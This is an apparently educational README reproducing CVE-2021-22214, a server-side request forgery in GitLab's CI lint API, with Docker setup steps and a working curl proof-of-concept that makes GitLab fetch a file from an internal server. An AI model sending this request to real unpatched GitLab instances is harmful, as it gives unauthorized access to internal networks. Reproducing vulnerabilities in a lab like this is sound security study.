# GitLab SSRF

This repository is a reproduction of [CVE-2021-22214](https://nvd.nist.gov/vuln/detail/CVE-2021-22214).

## CVE Details

### CVE-2021-22214

When requests to the internal network for webhooks are enabled, a server-side request forgery vulnerability in GitLab CE/EE affecting all versions starting from 10.5 was possible to exploit for an unauthenticated attacker even on a GitLab instance where registration is limited.

## Setting Up

For this reproduction, we will be using a vulnerable GitLab image, and running it using Docker Compose.

```sh
git clone https://github.com/CS4239-U6/gitlab-ssrf.git
cd gitlab-ssrf
docker-compose up
```

Two containers will be running - one will be the GitLab web server, and the other will be an internal NGINX server that's serving a static `.yml` file.
Our goal is to get the GitLab server to query for the internal `.yml` file, despite it being originally inaccessible to us.

When the GitLab container is fully up (which you can check by accessing `http://localhost:5000`), which can take quite long, you can run the following `curl` command to test it out:

```sh
curl --location --request POST 'http://localhost:5000/api/v4/ci/lint' \
--header 'Content-Type: application/json' \
--data '{ "include_merged_yaml": true, "content": "include:\n  remote: http://nginx:80/test.tml" }' \
--show-error
```
